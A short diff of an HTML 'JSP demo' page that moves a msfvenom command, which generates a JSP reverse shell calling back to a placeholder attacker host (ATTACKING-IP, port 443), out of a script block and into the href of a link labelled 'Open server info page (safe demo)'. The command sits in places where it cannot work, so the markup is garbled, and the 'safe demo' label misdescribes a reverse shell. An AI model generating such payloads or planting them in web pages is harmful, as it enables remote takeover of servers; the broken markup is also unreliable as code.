@@ -49,10 +49,8 @@
 </head>
 <body>
  <h1>JSP demo</h1>
-  <p><a href="shell.jsp">Open server info page (safe demo)</a></p>
-  <script>
-  msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKING-IP LPORT=443 -f raw > reverse-shell.jsp
-  </script>
+  <p><a href="msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKING-IP LPORT=443 -f raw > reverse-shell.jsp">Open server info page (safe demo)</a></p>
+  
   <div class="wrap" role="main">
     <header>
       <div style="display:flex;align-items:center;gap:14px">
